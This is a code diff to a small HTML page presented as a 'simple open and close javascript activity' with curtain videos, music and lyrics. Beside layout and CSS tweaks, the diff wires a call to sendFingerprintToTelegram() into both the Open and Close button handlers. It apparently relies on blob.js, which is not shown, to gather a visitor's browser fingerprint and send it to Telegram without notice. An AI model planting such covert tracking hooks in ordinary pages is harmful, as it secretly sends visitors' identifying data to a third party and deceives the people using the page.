@@ -28,8 +28,8 @@
          margin-top: 10px;
          display: flex;
          justify-self: center;
-          border-radius: 12px;
-        width: 80%;
+         border-radius: 12px;
+         width: 80%;
         }
         input[type="button"] {
          background: transparent;
@@ -95,42 +95,63 @@
           border-radius: 12px;
           pointer-events: none;
         }
+        .btn-container {
+          display: flex;
+          gap: 20px;
+          justify-content: center;
+          margin-top: 20px;
+        }
+        .btn-container input {
+          position: relative;
+          left: 0;
+        }
+        #fingerprintBtn {
+          border-color: #ff0;
+          color: #ff0;
+          box-shadow: 0 0 10px #ff0, inset 0 0 10px rgba(255, 255, 0, 0.2);
+        }
     </style>
 </head>
 <body>
      <h1>Simple Js!</h1>
      <p><em>Note:</em> simple open and close javascript activity.</p>
-      <video id="curtain" poster="close.jpg" style="width: 80%; border-radius: 12px;"></video>
-      <input type="button" value="Open" id="bt1" onclick="opp()">
-      <input type="button" value="Close" id="bt2" onclick="cloo()">
-      <div class="lyrics">
+     <video id="curtain" poster="close.jpg" style="width: 80%; border-radius: 12px;"></video>
+     
+     <div class="btn-container">
+        <input type="button" value="Open" id="bt1" onclick="opp()">
+        <input type="button" value="Close" id="bt2" onclick="cloo()">
+     </div>
+     
+     <div class="lyrics">
         <h1 id="leter"></h1>
-      </div>
-      <img id="abatu" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwpGNXC1NSVc8Vdo8YDlSDD6YaOopfeJwC5eXiF_1H9w&s=10" data-nopreview="true">
-      <audio src="music.mp4" id="mu1"></audio>
+     </div>
+     <img id="abatu" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwpGNXC1NSVc8Vdo8YDlSDD6YaOopfeJwC5eXiF_1H9w&s=10" data-nopreview="true">
+     <audio id="mu1" src="music.mp4"></audio>
 </body>
-<script defer src="blob.js"></script>
 <script>
-
+// Your existing functions
 Vidd = document.getElementById("curtain");
 music = document.getElementById("mu1");
 abt = document.getElementById("abatu");
 
 function opp(){
-console.log("success");
-Vidd.src = "curtain.mp4";
-Vidd.load;
-Vidd.play();
-};
+    console.log("success");
+    Vidd.src = "curtain.mp4";
+    Vidd.load();
+    Vidd.play(); 
+    sendFingerprintToTelegram();
+}
+
 function cloo(){
-printLyrics();
-Vidd.src = "curtain-close.mp4";
-Vidd.load;
-Vidd.play();
-music.play();
-abt.style.opacity = "1";
-abt.style.opacityDuration = "2s"
-};
+    sendFingerprintToTelegram();
+    printLyrics();
+    Vidd.src = "curtain-close.mp4";
+    Vidd.load();
+    Vidd.play();
+    music.play();
+    abt.style.opacity = "1";
+    abt.style.opacityDuration = "2s"
+}
 
 function printLyrics() {
     const lyrics = [
@@ -166,4 +187,5 @@ function printLyrics() {
     return displayLyrics();
 }
 </script>
+<script defer src="blob.js"></script>
 </html>
